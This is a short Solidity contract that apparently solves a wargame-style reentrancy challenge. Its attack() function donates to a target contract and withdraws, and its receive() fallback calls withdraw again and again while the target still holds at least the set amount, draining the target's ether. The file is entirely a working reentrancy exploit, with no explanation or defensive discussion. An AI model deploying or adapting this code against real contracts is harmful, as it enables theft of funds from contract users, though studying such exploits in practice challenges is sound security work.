//"SPDX-License-Identifier: MIT"
pragma solidity ^0.8.7;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ForceAttack {
  IReentrance reentrance;
  uint amount = 1000000000000000;

  constructor(IReentrance _reentrance) public {
    reentrance = _reentrance;
  }

  function attack() external payable {
    reentrance.donate{value: msg.value}(address(this));
    reentrance.withdraw(amount);
  }

  receive() external payable {
    if (address(reentrance).balance >= amount) {
      reentrance.withdraw(amount);
    }
  }
}